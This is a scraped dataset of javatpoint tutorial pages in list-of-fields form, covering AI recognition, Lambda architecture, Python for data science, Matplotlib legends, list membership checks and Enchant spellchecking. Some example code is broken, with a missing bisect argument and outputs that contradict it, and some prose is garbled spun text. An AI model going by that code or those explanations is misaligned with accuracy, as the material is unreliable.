unstructured ""blob"" of value that is not being utilized. The applications of this pattern are seen in many different applications, from medical imaging, autonomous vehicle handwriting recognition, facial recognition or speech recognition, or even the most precise objects in data and videos of all kinds. Machine-learning-enabled recognition has provided considerable capabilities to surveillance and security systems and allows them to monitor multiple videos in real-time and identify things like delivery vehicles or even people who are in an area they shouldn\'t be at a specific time of the day.', ""The applications for businesses that make use of recognition patterns are numerous. For instance, in the e-commerce and online retail industries, there is a requirement to recognize and tag images for items sold on the internet. Before, humans had to meticulously catalogue each image in accordance with all their attributes, labels, and categories. Today, machine-learning-based recognition systems can quickly find items that aren't listed in the catalogue and then utilize the entire range of information and metadata needed to market those items on the internet without human involvement. This is a fantastic opportunity for AI to join the fray and perform the job much more quickly and efficiently than a human who will eventually become bored or exhausted. Additionally, AI systems will be able to avoid human error and permit workers to focus on tasks with greater value."", ""This recognition pattern is being utilized with images, but it's also being used to detect speech. There are a variety of applications available that identify the song playing or even detect the voice of a person talking. Another possible application for this pattern of recognition is to recognize animal sounds. The use of automated sound recognition is beneficial in the field of wildlife and conservation research. Using machines that identify the different animal sounds and sounds could be an excellent method of tracking the population and its habits, as well as understanding the different species. There is even the possibility of using this for areas like vehicle maintenance, where the machine is able to detect different sounds produced by engines and then inform the person operating the vehicle of the issue and the issue that needs to be addressed and how quickly."", ""The most frequently used application of pattern recognition used by artificial intelligence involves the detection of text and handwriting. Although we've had optical character recognition (OCR) technology that is able to translate printed characters into text for a long time, conventional OCR was restricted in its ability to handle handwriting and fonts of any type. Machine learning-enabled handwriting and recognition is much better in this regard because it is able to recognize text across a broad variety of handwritten or printed modes and recognize the kind of data being stored. For example, if the text is formatted in tabular or column form, it is able to recognize the tables or columns and translate them into the correct format to be used by machines. Additionally, the systems are able to discern patterns in the data, like Social Security numbers or credit card numbers. One of the uses that use this kind of technology is an automatic deposit of checks at ATMs. Customers place their handwritten checks into machines. It is then used to deposit checks without needing to visit an actual person to deposit your check."", ""The pattern of recognition of AI can also be used to recognize human movements. This is already utilized within the game sector. Users can use certain movements or gestures, which can be used in-game to move characters or complete the task. Another significant application allows players to simulate various clothing and accessories. It's also being used in the medical field by surgeons to assist them in completing tasks and instructing people on how to complete certain tasks before practicing the same tasks on a person. With the help of this pattern of recognition, the machines are able even to comprehend the sign language, understand gestures and translate them when required, without human intervention."", 'In the medical field, AI is being used to detect patterns in various radiology images. For instance, the systems are employed to identify fractures blockages, aneurysms, and possibly cancerous structures and are even used to identify possible tuberculosis and coronavirus-related diseases. Analyst firm Coanalytic is forecasting that within only a few years, machines will begin performing the first-ever analysis of all radiology images, allowing for immediate identification of patterns or anomalies before they are sent to a human radiologist to be further evaluated.', 'The application of this type of AI has a direct impact on every sector, from using images to receive insurance quotes to studying satellite images following natural disasters to determine damage. Given the effectiveness of machine learning to identify patterns and apply them to recognize, it should not be a surprise that this kind of AI will continue to witness widespread adoption. In reality, in two or three years, we may become accustomed to the recognition patterns of AI as a given and not even think of it as AI. This is a testament to the power of this AI-inspired pattern.']",[],[],[],[]
434,['When and How to Leverage Lambda Architecture in Big Data'],"['In the current technology environment, numerous companies are attracted by Big data. However, in the past Big data utilized data stored in the Hadoop technology and had to deal with the issue of latency. An entirely new system could be used for large amounts of data and with high speeds to solve this issue completely.']","['https://www.javatpoint.com/why-should-we-learn-python-for-data-science', 'https://www.javatpoint.com/understanding-recognition-pattern-of-artificial-intelligence', 'https://www.javatpoint.com/why-should-we-learn-python-for-data-science', 'https://www.javatpoint.com/understanding-recognition-pattern-of-artificial-intelligence', 'https://www.javatpoint.com/why-should-we-learn-python-for-data-science']",['https://static.javatpoint.com/python/images/when-and-how-to-leverage-lambda-architecture-in-big-data.png'],[],"['Applications of Lambda Architecture:', 'Merits of Lambda Architecture', 'Disadvantages of Lambda Architecture', 'A Unified Approach to Lambda Architecture', 'An Outline of the Architecture', 'Conclusion']","['What is this Architecture all about?', 'Data Lake:', 'Real-Time Working Examples:']",[],"[""Let's look at a few facts about Lambda Architecture."", 'The technology can also solve the issue of arbitrary computing functions. In general, the problem can be divided into three levels:', 'The serving layer serves as the layer which combines the results from the two layers to produce the final.', 'While the batch layer performs two crucial roles.', 'The most significant advantages of this architecture are described in the following paragraphs:', 'In short, the benefits of this design are:', 'The image below will help you gain a better understanding of the issues mentioned above.', 'Lambda architecture has proven itself many applications. A few of the examples that are working are listed in the following:', 'Each year, more companies are moving to Big Data.']","[""In this article, we'll attempt to make it easy to comprehend the structure, which makes it easy to use Big Data, which is nothing but Lambda Architecture. The design was developed in the hands of James Warren & Nathan Marz."", 'In this model, we can access both historical and new data. To get a better understanding of the movement of data in the past, information is transmitted to the data storage.', 'The basic idea behind this architecture is built on Lambda calculus and is known as Lambda Architecture. The architecture was specifically designed to work with unchangeable data sets, specifically for the purpose of its manipulation.', 'When data is transferred to the system, it is separated into speed and batch layers. The queries are answered through the integration of real-time view and batch view.', 'Lambda architecture offers a variety of advantages, but the most significant ones are impermanence, fault tolerance, and it is used to perform re-computation or precomputation.', ""Selecting a lambda framework for an enterprise that is preparing a data lake can have some negatives, too, especially in the event that certain aspects aren't taken into consideration. Certain of these points are listed in the following paragraphs:"", 'The unification approach tackles the volume and velocity issues of Big Data as it utilizes a hybrid computing model. The model blends immediate and batch data with ease.', 'The architecture could be described as a pluggable system that can be used when a process is needed. Many data sources are plugged in or out based on the requirements.']","['For better business decisions and to gain insight, systems are designed to handle the variety, speed, and volume. This is a novel method of Big Data created to analyse, process, and insulate this data which is difficult and huge for the conventional system. The hybrid architecture aids in supporting the Big Data system in real-time and batch processing of data.', 'The image below will provide an understanding of the layers described above. Similar to Hadoop, this batch layer is referred to by the name of ""Data Lake"". It also functions as an archive for the past to store all data that has been fed into it. It also facilitates batch processing of data and aids in the generation of analysis results.', 'To speed up the steaming and queuing of data, the speed layer is put into the picture. The function of this layer is to conduct analytic calculations on real-time data. The speed layer shares many features with the batch layer in that it can also calculate analogous analytics. The only difference is that the analysis is performed on data that is recent. Based on the speed of the data, the data could be as little as an hour outdated.', 'The output of the batch layer is presented in the pattern of batch views, whereas the speed layer output is displayed in the form of live-time view patterns. The results are then passed to the layer serving. This indexing occurs in the serving layer so that requests can be made with low latency and in-demand.', 'The speed layer, also known as the stream layer, is responsible for data that was not presented through batch views because due to the delay that the batch layers suffer. The layer only handles the most recent data, so it can provide an entire view by creating real-time views.', 'In essence, we could say that in the Lambda structure, the data pipeline is separated into layers, and each is responsible for a specific task. In each layer, the provision is available to select the appropriate technology. For instance, in the Speed layer, one could select Apache Storm, Apache Spark streaming, or other technology.', 'In the lambda structure, errors can be quickly rectified, as that it is necessary to return to the original version of the data. This can be accomplished because, in this case, data is never changed, but it is added in the event that the programmer inputs inaccurate data. They can delete and then recompute the data.', 'The greatest benefit of this system is that it offers almost unlimited memory capacity as well as storage space. There is even an in-memory data store that has capacities of terabytes which is spread across all of the clusters. This type of architecture is reasonably cost-effective since it comes with built-in fault tolerance.', 'With this huge data lake cluster, Data Lake can be built for any business. The entire data of the business is stored within the cluster and be shared via the cloud. The computational power of the architecture is able to be used to analyse the cluster. With this fault-resistant design, it is possible to reduce costs because a large number of duplicate ETL processes are prevented from interfacing with other systems.', 'The world is constantly undergoing new developments in the field of Big Data. Lambda architecture is built on log insertion and the analytics that accompany that. Most of the time, log messages are not contested and are produced at high speed, which is why they are often referred to as ""fast data"". There isn\'t a hard nor fast law that says that every log entry must receive an answer from the entity to which the data came since it\'s only a one-way pipeline.', 'The processing of Big data is categorized into two pipelines data. One pipeline is where data is gathered in a huge quantity from various sources and stored in a distributed manner. The data is then analyzed to obtain the precise information needed to make better business decision-making. The procedure followed could be called a batch processing pipeline.', 'In simple terms, the data pipeline architecture is designed to collect data and routes it through the data pipeline to provide insight into the analytical and intelligence of the business. It extracts and transforms data and then feeds it into databases.', 'Another method of processing data using the Lambda architecture followed is an analysis of data while the data is in motion. This process is called the streaming data Pipeline. This is where the calculations are performed using live data. The framework we can use to do this is Apache Spark. The framework used for this is Apache Spark. Spark, it is possible to have the information separated into smaller batches, which stores them in memory and process the data and eventually remove the data from memory. The method used here can reduce the amount of latency since calculations are performed in memory.', ""As mentioned above, one of the major drawbacks of the Lambda structure is its complexity. It's ongoing troublesome maintenance and installation because one must sync two systems that are distributed. To overcome these issues, there are three different methods that we will discuss below:"", 'Big data systems typically operate on raw and partially structured data. Organizations today require systems that have the capacity to process batch as well as real-time data. Lambda architecture is equipped to handle both processes. In the meantime, it is able to build impermanence in the process.', ""The structure follows a solid set of guidelines, and it is an agonist of technology. Any technology can be integrated into it to accomplish the task since it's made up of different layers. Ready cloud components are accessible and can be used using the lambda structure."", 'Since the beginning of time, Big data technology has gained popularity. But when it comes to the requirements of a company such as Google or Facebook, the technology in place was not suited to the demands of the business. To satisfy their requirements, a standardized and flexible architecture was needed, leading to the creation of Lambda architecture.', 'Following the introduction of this model, the proper planning must be taken to transfer the data into Data Lake. Since the architecture focuses on analytics, one could utilize the traditional transactional database to transfer the data into the cluster.']",[],[],[],"[""|||Batch|||Serving|||Speed||||||Management of the master data set.|||Batch View pre-computation.||||||In this model, the data is stored in its raw format. This facilitates the development of new user cases analytics, as well as a brand new data processing algorithm by generating a basic batch and speed view. This is an enormous advantage over traditional data warehouses. In the past, data schemas had to be updated to accommodate new applications and was a lengthy process.|||Re-computation is an additional feature of this design. This fault tolerance is able to be fixed without any difficulty. If a data lake has massive amounts of data, the likelihood is that corruption and loss of data can occur, but this can't be prevented. This design allows for rollback, flushing of data, and re-computation of data to rectify these errors.|||The architecture places the greatest importance on keeping the input data in the same form. Data transformation for models is an additional crucial aspect of the structure. This allows for tracking MapReduce workflows. MapReduce performs batch processing on the entire data. The data is debugged separately in each step. The main issue that data processing in-stream has confronted is reprocessing issues. The input data drives output using this method.||||||Human error tolerance|||Tolerance in the case of hardware defects.||||||The various layers of this structure can make it more complicated. The synchronization between layers could be costly. Therefore, it must handle in a prudent way.|||Maintenance and support become difficult due to the different dispersed layers, such as speed and batch.|||Many technologies are emerging that can aid in the building of Lambda architecture. However, finding those who are proficient in these new technologies isn't easy.|||It's not easy to implement this model for open-source technology, and the problem gets worse when it is implemented on the cloud.|||Maintaining the code that is part of the architecture can be a challenge since it is required to generate similar results across a distributed environment.|||It's also difficult to code in Big Data frameworks such as Hadoop and Storm.||||||Flexible frameworks and the adoption of a pure streaming model. In this case, Apache, Samza can be an ideal choice. It is an extensible distributed streaming layer, which can be used to perform batch processing.|||A different approach to the discussion above could also be considered. The choice of flexible batches is an option. Make sure to select batches of a small size so that it is near real-time batches. In this case, Apache Stark or Storm's Trident could be used.|||Combining real-time and batch processing with stack technology could be an alternative method. In this case, Lambda Loop and SummingBird could be viable options. The result is merged in SummingBird, both instantaneous and batch data since it's a hybrid system. In Lambda Loop, the same method is used.||||||Twitter and Groupon have numerous applications. Lambda architecture can be used to comprehend the meaning of tweets and is used to perform sentiment analysis.|||Crashlytics: Here, it is concerned specifically with mobile analysis that is used to generate significant analytical outcomes.|||Stack overflow is an extremely well-known and popular forum that has huge users. It is a place where people can ask questions and solutions. In this forum, batch views are utilized to analyse the results of the voting.|||""]"
435,['Why Should We Learn Python for Data Science?'],"['Python is a programming language that continues to grow in popularity. Being a high-level language, Python is a language that emphasizes readability over complexity. It has an easy-to-follow indentation system that makes it the preferred language of researchers and programmers alike.']","['https://www.javatpoint.com/how-to-change-legend-position-in-matplotlib', 'https://www.javatpoint.com/when-and-how-to-leverage-lambda-architecture-in-big-data', 'https://www.javatpoint.com/how-to-change-legend-position-in-matplotlib', 'https://www.javatpoint.com/when-and-how-to-leverage-lambda-architecture-in-big-data', 'https://www.javatpoint.com/how-to-change-legend-position-in-matplotlib']","['https://static.javatpoint.com/python/images/why-should-we-learn-python-for-data-science.png', 'https://static.javatpoint.com/python/images/why-should-we-learn-python-for-data-science2.png', 'https://static.javatpoint.com/python/images/why-should-we-learn-python-for-data-science3.png', 'https://static.javatpoint.com/python/images/why-should-we-learn-python-for-data-science4.png', 'https://static.javatpoint.com/python/images/why-should-we-learn-python-for-data-science5.png']",[],"['Why learn Python for data science?', 'Is Python Better than R for Data Science?', 'Data Exploration', 'Is Python Necessary in the Data Science Field?']","['Statistical Modelling', 'Data visualization']",[],"[""This is why it's worth studying to program in Python in order for a way to master data manipulation in any way or form."", 'They differ in the way they consider each pillar, resulting in results that examine the information from a different angle.', 'R was created to accomplish this in-built, whereas Python can achieve similar results by making use of third-party libraries.', ""Without any additional packages, R can do modelling (linear models), but Python isn't able to.""]","['Python is among the most widely used code languages used in the world. Its position at the top of the list of languages for coding is confirmed by its passionate community of learners and users, who are increasing by the minute.', 'The principal reason behind the popularity of Python is its ease of use and versatility. In the 2000s, people were terrified of programming because of the complexity and difficulty of programming languages such as C++, Java, and Lisp.', 'In essence, R is used exclusively to analyse data and statistics, while Python is a general-purpose language utilized in different types of data science and software engineering.', 'Although they share a lot of similarities in terms of usage and purpose, R and Python are not identical when it comes down to the four elements of data science, including exploration, collection modelling, visualization, and collection.', 'With Python, we are able to take advantage of its many libraries that allow us to explore our data without writing codes from scratch. For example, with Pandas, we can sort, filter, and present data sets and collections.', ""Data visualization is among R's best assets since it was developed to display the results of statistical analysis. That's why it is easy to make sleek and impartial graphic designs."", 'But, if we decide to ignore Python and R, we could be missing many important opportunities in our professional careers. Additionally, we could be spending time and energy figuring through problems we could not have encountered using Python.']","[""Python is easy to master in parts because it's an extremely high-level programming language. It's more similar to human language than the binary languages that machines use. We'll have to remember the few dozen reserved syntax terms and formats Python can be written using English, which allows anyone to figure out the meaning of a few lines of code does without needing access to the software."", ""And, unlike many other languages, We can begin using Python to analyse data sets even when we are inexperienced users. This is possible because of the pre-programmed syntax that is easy to create and execute with concrete results early during your learning journey. Later, as we get familiar with various syntax commands specific to our needs - and perhaps even starting to create our syntax - we'll be amazed at how efficiently Python allows us to carry out operations and tasks quickly and efficiently."", ""There's only one other programming language with a good reputation that can compete with Python in data science, and its R -- and should not be misunderstood with Ruby. Although each R and Python is utilized regularly by analysts, data scientists, and researchers, they play different functions."", ""It is possible to think of data exploration as the little sibling to data analysis. The process involves analysing the data in search of underlying patterns and characteristics that are shared. However, data exploration doesn't provide important insights from the data, but it is utilized to help scientists understand the larger picture and, in the process, to be followed."", ""However, R is also more statistical. R is a great tool for filtering and displaying data as well as executing statistical tests. R has built-in data types for matrices, vectors, and DataFrame. Python doesn't include these features in itself. However, data scientists utilize these libraries. NumPy as well as the Pandas libraries. These libraries also have the benefit of being built over the C programming language, which means they are able to perform operations on huge datasets much quicker than R."", ""After collecting and analysing our data, it's a moment to develop a suitable model. Modelling data is the process of creating a model that is an abstract set of rules that define the relationship between data elements and one another, typically with reference to the physical world. If models can be used to create predictions regarding data that is not seen, it is referred to as machine learning."", 'Python is a language that allows you to build custom data modelling by doing a bit of effort. In contrast, and similar to data exploration, we could make use of software from pre-built Python libraries to build our model. For instance, we could create numerical data models using NumPy or employ machine learning algorithms with scikit-learn. Similar results to R will require us to depend on other packages because its primary functionality does not allow modelling.', 'Each Python and R are able to do statistical modelling. However, R is meant for static analysis, creating a report or paper. In order to implement the model and allow it to be used in live decision-making within a site or application. This is due to the fact that Python is a true general-purpose programming language. Therefore, it can be used with software frameworks that make use of Python, including Django or Flask.', 'As the name suggests, it represents data visually by using graphs, charts, charts, plots, and maps to show your results. Although it might sound easy initially, data visualization is an extremely delicate process since the outcomes of a poor-quality visualization may be confusing or difficult to comprehend.', ""Python can generally be considered to be effective in the field of data exploration, and it has tools for the deployment of models. However, in the visualization of data, it's a little more difficult to work with Python over R. Still, it is possible to use some of Python's other external libraries like Matplotlib and Seaborn to produce charts and graphs that reflect our results."", ""For a career in Data Science, we'll have to master at least one of two languages, either Python as well as R. If users are already familiar with working with R and Python, it's recommended to explore it prior to attempting another language. However, If they are a novice, they should start with Python because of its flexibility."", ""Python is extremely adaptable and accommodating -- two characteristics vital in handling huge amounts of data frequently. If we choose to use the correct structure and syntax, we'll be able to use a variety of algorithms to manipulate our data in the way we need. This is a difficult task in more rigid languages, which requires us to master completely new techniques before we are able to apply a new kind of operation or computation to our data."", ""Python is able to grow with our progress. Even as a beginner with just a few months of Python experience and the aid of the numerous tutorials and tutorials available on the internet, we can begin making use of databases and analysing them. When we're more adept, we will be able to use the many Python libraries available online to reduce time and effort. In addition, that we can make ourselves our loops and conditionals and syntax to cut down on time spent working and code volume and make it simpler to analyse and correct our code for mistakes in the future."", ""In our quest to master Python, it is crucial to take courses and classes specialized in teaching Python to data scientists. The capabilities we'll require the most in Python depend on our industry and the application. There are many online sources to master Python at no cost. Additionally, that we don't require specific software or gadget to begin learning. All we'll require is Python source code and an editor for code. They're all easily accessible and are cost-free to download and use.""]",[],[],[],[]
436,"['How to Change the ""legend"" Position in Matplotlib']","['In this tutorial, we will discuss how to change the legend position in Matplotlib.']","['https://www.javatpoint.com/how-to-check-if-element-exists-in-list-in-python', 'https://www.javatpoint.com/why-should-we-learn-python-for-data-science', 'https://www.javatpoint.com/how-to-check-if-element-exists-in-list-in-python', 'https://www.javatpoint.com/why-should-we-learn-python-for-data-science', 'https://www.javatpoint.com/how-to-check-if-element-exists-in-list-in-python']","['https://static.javatpoint.com/python/images/how-to-change-legend-position-in-matplotlib.png', 'https://static.javatpoint.com/python/images/how-to-change-legend-position-in-matplotlib2.png', 'https://static.javatpoint.com/python/images/how-to-change-legend-position-in-matplotlib3.png', 'https://static.javatpoint.com/python/images/how-to-change-legend-position-in-matplotlib4.png']",[],"['Approach', 'Conclusion']","['Example 1:', 'Example 2: With Position on Upper Right', 'Example 3: Position of legend on Lower Left, with is also ""3""', 'Example 4: Legend Position at Center']",[],"['First, we will discuss some basic concepts:', 'Legend at lower left', 'In this tutorial, we showed how to change the position of legend using Matplotlib in Python.']",[],[],"['# First, we will import the required module', 'import numpy as npy', 'import matplotlib.pyplot as mplot', '# Now, we will create data', 'x1 = npy.linspace(1, 55, 55)', 'npy.random.seed(1)', 'y1 = npy.random.randint(0, 25, 55)', '# Then, we will plot graph', 'mplot.plot(x1, y1)', '# Here, we will add legend', ""mplot.legend(['Legend'])"", 'mplot.show()', '# First, we will import the required module', 'import numpy as npy', 'import matplotlib.pyplot as mplot', '# Now, we will create data', 'x1 = npy.linspace(1, 55, 55)', 'npy.random.seed(1)', 'y1 = npy.random.randint(0, 25, 55)', '# then, we will plot graph', 'mplot.plot(x1, y1)', '# Here, we will add legend and set position to upper right', ""mplot.legend(['Legend'], loc = 'upper right')"", 'mplot.show()', '# First, we will import the required module', 'import numpy as npy', 'import matplotlib.pyplot as mplot', '# Now, we will create data', 'x1 = npy.linspace(1, 55, 55)', 'npy.random.seed(1)', 'y1 = npy.random.randint(0, 25, 55)', '# then, we will plot graph', 'mplot.plot(x1, y1)', '# Here, we will add legend and set position to lower left That is: 3', ""mplot.legend(['Legend'], loc = 3)"", 'mplot.show()', '# First, we will import the required module', 'import numpy as npy', 'import matplotlib.pyplot as mplot', '# Now, we will create data', 'x1 = npy.linspace(1, 55, 55)', 'npy.random.seed(1)', 'y1 = npy.random.randint(0, 25, 55)', '# then, we will plot graph', 'mplot.plot(x1, y1)', '# Here, we will add legend and set position to upper left', ""mplot.legend(['Legend'], loc = 'center')"", 'mplot.show()']",[],['Location String|||Location String&&&Best|||0&&&Upper right|||1&&&Upper left|||2&&&Lower left|||3&&&Lower right|||4&&&Right|||5&&&Centre left|||6&&&Centre right|||7&&&Lower centre|||8&&&Upper centre|||9&&&centre|||10'],"['|||Matplotlib is a powerful visualization library written in Python for plots in 2D arrays. It was developed in the hands of John Hunter within the year 2002. Matplotlib could be a data visualization tool for multi-platform platforms based on NumPy arrays and is developed to integrate alongside the wider SciPy stack.|||A legend is a space that describes the various elements that make up the graph. Within the matplotlib library, there is a function named legend() that can be utilized to create an axes-specific legend.|||This attribute Loc in the legend() uses the attribute Loc to define the exact location in the legend.Default value for Loc will be loc = ""best"" (upper left). The strings that are best upper left, upper right, lower left, the lower left and right middle left middle, lower center, and center will place the legend in the appropriate area of the axes/figure.||||||Step 1: We will import required modules and libraries.|||Step 2: We will import or create the data.|||Step 3: We will Plot a chart|||Step 4: We will add legend|||Step 5: We will set the position of legend by using loc.|||']"
437,['How to Check if Element Exists in List in Python'],"['The list is a crucial container in Python because it is able to store elements of all types of data as a collection. Knowing specific list operations is essential to be able to program day-to-day. This article will discuss one of the most fundamental list operations, which is to verify the existence of the elements on the list.']","['https://www.javatpoint.com/how-to-check-spellings-of-given-words-using-enchant-in-python', 'https://www.javatpoint.com/how-to-change-legend-position-in-matplotlib', 'https://www.javatpoint.com/how-to-check-spellings-of-given-words-using-enchant-in-python', 'https://www.javatpoint.com/how-to-change-legend-position-in-matplotlib', 'https://www.javatpoint.com/how-to-check-spellings-of-given-words-using-enchant-in-python']",[],[],['Conclusion'],"['Method 1: Naive Method', 'Method 2: Using in', 'Method 3 : Using set() + in', 'Method 4 : Using sort() + bisect_left()', 'Method 5 : Using count()']",['Note: The bisect function will only give the location of the element but not provide details of whether the element is there or not.'],"['Code #1: A demonstration of how you can check whether an element is in the list by using the Naive method as well as in.', 'Code #2: Demonstrating to check existence of element in list using set() + in and sort() + bisect_left().', 'Code #3: Explaining how to verify the presence of elements on the list by counting().', 'In this tutorial, we discussed how to check if the given element exists in the list using different methods in Python.']","['In the Naive approach, one employs a loop to iterate through the entire list of elements to verify whether the element is a target element. This is the most efficient method of determining the presence of the element on the list.']","['Python is the most common method of determining whether an element is present in a list. This method returns True if the element is present in the list and False if it is not within the set. The list does not need to be sorted in order to use this method of checking.', ""Converting the list to the set and then using the in may make more sense than just making use of in. However, efficiency as a plus has some drawbacks. One of these concerns is that order in which the list is displayed isn't maintained. If you choose to make a list and make a new one, you'll need to make use of additional space. Another issue is that set doesn't allow duplicates, and therefore duplicate elements will be eliminated from the list."", 'The traditional binary search method to determine the existence of elements means that list must be sorted first, thus not keeping the order of elements. Bisect_left() will return the very first instance of an element found. It works similarly with lower_bound() in C++ STL.', ""We can make use of the built-in Python List method count() to verify whether the element passed is present in the List. If the element that we passed is in the List, then the count() technique will reveal how many instances it is present throughout the list. If it's a positive number, that means that an element exists within the List.""]","['# First, we will initialize list', 'test_list1 = [ 1, 5, 2, 6, 3, 5 ]', 'print (""Check if 5 exists in list (using loop): "")', '# Here, we will checking if 7 exists in list using loop', 'for K in test_list1:', 'if(K == 7) :', 'print (""Given element Exists"")', 'else:', 'print (""Given element does not exists"")', 'print (""Check if 5 exists in list (using in): "")', '# Here, we will check if 5 exists in list using in', 'if (5 in test_list1):', 'print (""Given element Exists"")', 'print (""Given element does not exists"")', 'Check if 5 exists in list ( using loop ) :', 'Given element does not exists', 'Check if 5 exists in list ( using in ) :', 'Given element Exists', 'from bisect import bisect_left as BL', 'from bisect import bisect as BS', '# First, we will initialize list', 'test_list_set1 = [ 1, 5, 2, 6, 3, 5 ]', 'test_list_bisect1 = [ 1, 5, 2, 6, 3, 5 ]', 'print (""Checking if 5 exists in list (using set() + in): "")', '# Check if 7 exists in list using set() + in', 'test_list_set1 = set(test_list_set1)', 'if 7 in test_list_set1:', 'print (""Given element Exists"")', 'print (""Given element does not exists"")', 'print (""Checking if 7 exists in list (using sort() + bisect_left()): "")', '# Check if 8 exists in list using sort() + bisect_left()', 'test_list_bisect1.sort()', 'if BL(test_list_bisect1, )!= BS(test_list_bisect1, 8):', 'print (""Given element Exists"")', 'print (""Given element does not exists"")', 'Checking if 5 exists in list (using set() + in):', 'Given element does not exists', 'Checking if 7 exists in list (using sort() + bisect_left()):', 'Given element does not exists', '# First, we will initialize list', 'test_list1 = [ 1, 5, 2, 6, 3, 5, 46, 2 ]', 'print (""Checking if 5 exists in list: "")', '# Here we will calculate the number of times element exists in list', 'exist_count1 = test_list1.count(5)', '# Now, we will check if it is more then 0', 'if exist_count1 > 0:', 'print(""Yes, 5 exists in list"")', 'print(""No, 5 does not exists in list"")', '#Checking for another number:', 'print (""Checking if 46 exists in list: "")', '# Here we will calculate the number of times element exists in list', 'exist_count2 = test_list1.count(46)', '# Now, we will check if it is more then 0', 'if exist_count2 > 0:', 'print(""Yes, 46 exists in list"")', 'print(""No, 46 does not exists in list"")', 'Checking if 5 exists in list:', 'Yes, 5 exists in list', 'Checking if 46 exists in list:', 'Yes, 46 exists in list']","['Check if 5 exists in list ( using loop ) :', 'Given element does not exists', 'Check if 5 exists in list ( using in ) :', 'Given element Exists', 'Checking if 5 exists in list (using set() + in):', 'Given element does not exists', 'Checking if 7 exists in list (using sort() + bisect_left()):', 'Given element does not exists', 'Checking if 5 exists in list:', 'Yes, 5 exists in list', 'Checking if 46 exists in list:', 'Yes, 46 exists in list']",[],[]
438,['How to Check Spellings of Given Words using Enchant in Python'],"['Python has a module named Enchant, which is used for checking the spellings of the word and giving suggestions for corrections. It also gives options for antonym and synonym of the words. It can also check in the dictionary if a word exists or not.']","['https://www.javatpoint.com/python-program-to-count-number-of-matching-characters-in-a-pair-of-string', 'https://www.javatpoint.com/how-to-check-if-element-exists-in-list-in-python', 'https://www.javatpoint.com/python-program-to-count-number-of-matching-characters-in-a-pair-of-string', 'https://www.javatpoint.com/how-to-check-if-element-exists-in-list-in-python', 'https://www.javatpoint.com/python-program-to-count-number-of-matching-characters-in-a-pair-of-string']",[],[],['Conclusion'],['Installation:'],[],"['In Enchant module, we can also use suggest() function for correcting spellings of the incorrectly spelled word.', 'To install Enchant module, we can use the following command:', 'Example: To check the spelling of the words and get suggestions for corrections']","['The check() function returns ""true"" if the given the word is present in the language dictionary; otherwise, it will return ""false"". We can also use this functionality of the check() function for checking the spelling of the words.', 'In this tutorial, we will see an example to understand the usage of Enchant module in Python for checking in spellings of the given the word and suggestions for correct spellings.', 'In this tutorial, we discussed how to install, and use Enchant module for checking the spellings of the given words and get suggestions for misspelled words.']",[],"['!pip3 install pyenchant', 'Collecting pyenchant', 'Downloading pyenchant-3.2.2-py3-none-win_amd64.whl (11.9 MB)', 'Installing collected packages: pyenchant', 'Successfully installed pyenchant-3.2.2', '# First, we will import the required module', 'import enchant as EC', '# Now, we will create dictionary for the language in use (en_US here)', 'dict1 = EC.Dict(""en_US"")', '# Then, we will create the list of words', 'words1 = [""Sung"", ""Cer"", ""BOOK"", ""Peaple"", ""Dronk"", ""Bat"", ""Beur"", ""Plut"", ""Pot""]', '# Here, we will be finding those words that may be misspelled', 'misspelled1 = []', 'for word in words1:', 'if dict1.check(word) == False:', 'misspelled1.append(word)', 'print (""The misspelled words in the list are : "" + str(misspelled1))', '# Now, we will use suggest() function for the correct spelling of the misspelled words', 'for word in misspelled1:', 'print (""Suggestion for misspelled"" + word + "" : "" + str(dict1.suggest(word)))', ""The misspelled words in the list are : ['Cer', 'Peaple', 'Dronk', 'Beur', 'Plut']"", ""Suggestion for misspelledCer : ['Ce', 'Cr', 'Er', 'Cher', 'Cerf', 'Ser', 'Ter',"", ""'Cor', 'Cdr', 'Der', 'Ger', 'Per', 'Chr', 'Her', 'Yer']"", ""Suggestion for misspelledPeaple : ['Peale', 'People', 'Leaper', 'Plea']"", ""Suggestion for misspelledDronk : ['Cronk', 'Drink', 'Drone', 'Drank', 'Drunk', 'Drongo']"", ""Suggestion for misspelledBeur : ['Bur', 'Beer', 'Bear', 'Blur', 'Eur']"", ""Suggestion for misspelledPlut : ['Pluto', 'Slut', 'Prut', 'Glut', 'Pl ut',"", ""'Pl-ut', 'Plur', 'Put', 'Plus', 'Plat', 'Plot', 'Pout', 'Plug', 'Plum']""]","['Collecting pyenchant', 'Downloading pyenchant-3.2.2-py3-none-win_amd64.whl (11.9 MB)', 'Installing collected packages: pyenchant', 'Successfully installed pyenchant-3.2.2', ""The misspelled words in the list are : ['Cer', 'Peaple', 'Dronk', 'Beur', 'Plut']"", ""Suggestion for misspelledCer : ['Ce', 'Cr', 'Er', 'Cher', 'Cerf', 'Ser', 'Ter',"", ""'Cor', 'Cdr', 'Der', 'Ger', 'Per', 'Chr', 'Her', 'Yer']"", ""Suggestion for misspelledPeaple : ['Peale', 'People', 'Leaper', 'Plea']"", ""Suggestion for misspelledDronk : ['Cronk', 'Drink', 'Drone', 'Drank', 'Drunk', 'Drongo']"", ""Suggestion for misspelledBeur : ['Bur', 'Beer', 'Bear', 'Blur', 'Eur']"", ""Suggestion for misspelledPlut : ['Pluto', 'Slut', 'Prut', 'Glut', 'Pl ut',"", ""'Pl-ut', 'Plur', 'Put', 'Plus', 'Plat', 'Plot', 'Pout', 'Plug', 'Plum']""]",[],[]
439,['Python Program to Count the Number of Matching Characters in a Pair of String'],"['In this tutorial, we will discuss how the users can write a Python program for counting the number of matching characters in the given pair of strings.']","['https://www.javatpoint.com/ping-pong-game-using-turtle-in-python', 'https://www.javatpoint.com/how-to-check-spellings-of-given-words-using-enchant-in-python', 'https://www.javatpoint.com/ping-pong-game-using-turtle-in-python', 'https://www.javatpoint.com/how-to-check-spellings-of-given-words-using-enchant-in-python', 'https://www.javatpoint.com/ping-pong-game-using-turtle-in-python']",[],[],['Conclusion'],"['Approach 1:', 'Approach 2:', 'Approach 3:']",[],"['Example: Method 1', 'Example 2: Method 2', 'Example 3: Method 3']","['We will pass the pair of non-empty strings. The program will count the number of matching characters in that pair of strings. Here, we will consider that the strings we passed are having duplicates of characters in them.', 'We will then use string.find(\'character\') in Python to find the same characters. This will return the first occurrence index of the character in the string if found; otherwise, it will return ""-1"".', 'In this tutorial, we have discussed different methods of writing a Python program for counting the number of matching characters in the given pair of strings.']",[],"[""Input: string_1 = 'Javtpoint'"", ""strint_2 = 'Juvpionk'"", 'Output: no. matching characters in the pairs of strings: 6', '(That is, the matching characters are: - J, v, p, i, o, n)', ""Input: string_1: 'zyxw531@7#'"", ""string_2: 'xwuv234#'"", 'Output: no. matching characters in the pairs of strings: 4', 